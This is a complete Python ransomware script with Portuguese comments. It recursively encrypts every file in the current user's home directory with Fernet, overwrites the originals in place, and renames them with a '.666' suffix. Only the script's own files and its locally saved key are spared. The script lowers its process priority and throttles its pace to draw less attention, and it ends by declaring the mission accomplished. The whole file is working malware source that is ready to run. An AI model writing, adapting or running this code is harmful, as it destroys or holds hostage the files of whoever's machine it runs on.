import os
import time
from cryptography.fernet import Fernet

# ==============================
# CONFIGURAÇÕES
# ==============================

# ✅ Verbose Mode: controle de saída no terminal
VERBOSE = True

# ✅ Caminho agnóstico: ataca a HOME do usuário atual
def get_username():
    return os.getenv("USER") or os.getenv("LOGNAME") or os.getenv("USERNAME")

RootDir = os.path.expanduser("~")  # Usar home do usuário real (agnóstico)
# RootDir = r"/home/nad/Desktop/harpy_tools/py/system tools/ransomware/"


# ✅ Caminho do arquivo da chave
key_path = "key.key"

# ==============================
# LOGGING
# ==============================

def log(msg, verbose=VERBOSE):
    if verbose:
        print(msg)

# ==============================
# CHAVE (KEY)
# ==============================

def gerar_ou_carregar_chave():
    if os.path.exists(key_path):
        with open(key_path, "rb") as f:
            chave = f.read()
    else:
        chave = Fernet.generate_key()
        with open(key_path, "wb") as f:
            f.write(chave)
    return chave

# ==============================
# BUSCA DE ARQUIVOS
# ==============================

def encontrar_arquivos(diretorio_base):
    arquivos_para_criptografar = []
    arquivos_excluidos = {"ransom.py", "decrypt.py", "key.key"}

    log(f"[DEBUG] Escaneando: {diretorio_base}")
    for root, dirs, files in os.walk(diretorio_base):
        log(f"[DEBUG] Verificando pasta: {root}")
        for file in files:
            if file in arquivos_excluidos:
                log(f"[DEBUG] Ignorando: {file}")
                continue
            caminho_absoluto = os.path.abspath(os.path.join(root, file))
            log(f"[DEBUG] Arquivo válido: {caminho_absoluto}")
            arquivos_para_criptografar.append(caminho_absoluto)

    return arquivos_para_criptografar

# ==============================
# CRIPTOGRAFIA
# ==============================

def criptografar_arquivos(arquivos, fernet):
    for i, file_path in enumerate(arquivos):
        try:
            with open(file_path, "rb") as f:
                dados = f.read()

            dados_criptografados = fernet.encrypt(dados)

            with open(file_path, "wb") as f:
                f.write(dados_criptografados)

            novo_nome = file_path + ".666"
            os.rename(file_path, novo_nome)

            log(f"[+] Criptografado e renomeado: {novo_nome}")

        except Exception as e:
            log(f"[!] Falha ao criptografar {file_path}: {e}")

        # ✅ Limita uso de processamento (leve delay a cada 10 arquivos)
        if i % 10 == 0:
            time.sleep(0.5)

# ==============================
# EXECUÇÃO
# ==============================

if __name__ == "__main__":
    try:
        os.nice(10)  # ✅ Baixa prioridade do processo (Linux only)
    except:
        pass

    log(f"[🦅] Usuário atual: {get_username()}")
    chave = gerar_ou_carregar_chave()
    fernet = Fernet(chave)
    arquivos = encontrar_arquivos(RootDir)
    criptografar_arquivos(arquivos, fernet)
    log("[✅] Missão concluída com sucesso.")
